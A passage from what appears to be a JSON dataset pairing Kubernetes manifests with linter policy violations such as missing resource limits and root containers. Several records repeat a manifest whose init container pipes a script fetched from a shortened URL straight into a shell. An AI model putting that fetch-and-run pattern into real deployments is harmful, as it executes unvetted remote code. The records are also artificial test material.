    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borodapravitmirom/hipsterpayment:1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"server\" is not set to runAsNonRoot"
  },
  {
    "id": "8392",
    "manifest_path": "data/manifests/the_stack_sample/sample_3123.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borodapravitmirom/hipsterpayment:1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"server\" has cpu request 0"
  },
  {
    "id": "8393",
    "manifest_path": "data/manifests/the_stack_sample/sample_3123.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borodapravitmirom/hipsterpayment:1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "8394",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"web\" does not expose port 8000 for the TCPSocket"
  },
  {
    "id": "8395",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8396",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-web\" does not have a read-only root file system"
  },
  {
    "id": "8397",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"web\" does not have a read-only root file system"
  },
  {
    "id": "8398",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"web\" does not expose port 8000 for the HTTPGet"
  },
  {
    "id": "8399",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-web\" is not set to runAsNonRoot"
  },
  {
    "id": "8400",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"web\" is not set to runAsNonRoot"
  },
  {
    "id": "8401",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-web\" has cpu request 0"
  },
  {
    "id": "8402",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"web\" has cpu request 0"
  },
  {
    "id": "8403",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init-web\" has memory limit 0"
  },
  {
    "id": "8404",
    "manifest_path": "data/manifests/the_stack_sample/sample_3124.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      name: web\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: avasiliev/web:1.0\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /app\n      initContainers:\n      - name: init-web\n        image: busybox:1.32\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"web\" has memory limit 0"
  },
  {
    "id": "8405",
    "manifest_path": "data/manifests/the_stack_sample/sample_3126.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: kafka-connect\nspec:\n  selector:\n    app: kafka-connect\n  type: NodePort\n  ports:\n  - port: 8083\n    name: rest\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:kafka-connect])"
  }
]